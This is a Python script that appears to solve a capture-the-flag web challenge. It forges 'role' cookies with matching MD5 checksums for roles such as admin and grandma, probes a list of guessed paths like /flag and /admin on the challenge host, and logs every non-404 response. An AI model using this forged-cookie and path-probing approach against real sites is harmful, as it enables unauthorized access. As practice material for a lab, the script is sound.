import requests, hashlib
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
md5=lambda s:hashlib.md5(s.encode()).hexdigest()
cookiesets=[
  {"role":"grandma","checksum":md5("grandma")},
  {"role":'"grandma"',"checksum":md5("grandma")},
  {"role":"granny","checksum":md5("granny")},
  {"role":'"granny"',"checksum":md5("granny")},
  {"role":"admin","checksum":md5("admin")},
  {"role":"chef","checksum":md5("chef")},
  {"role":"user","checksum":md5("user")},
  {"role":"kitchen helper","checksum":md5("kitchen helper")},
]
paths=["/","/login","/grandma","/granny","/pantry","/kitchen","/cellar","/sour","/pickle","/recipe","/secret","/flag","/admin","/logout","/cook","/ingredient","/ingredients","/food","/best","/meal"]
for cs in cookiesets:
    hits=[]
    for p in paths:
        try:
            r=requests.get(URL+p, cookies=cs, timeout=12, verify=False)
            if not (r.status_code==404 and len(r.content)==207):
                hits.append((p,r.status_code,len(r.content)))
        except Exception as e: hits.append((p,"ERR"))
    print(cs, "->", hits if hits else "all 404")
print("DONE")
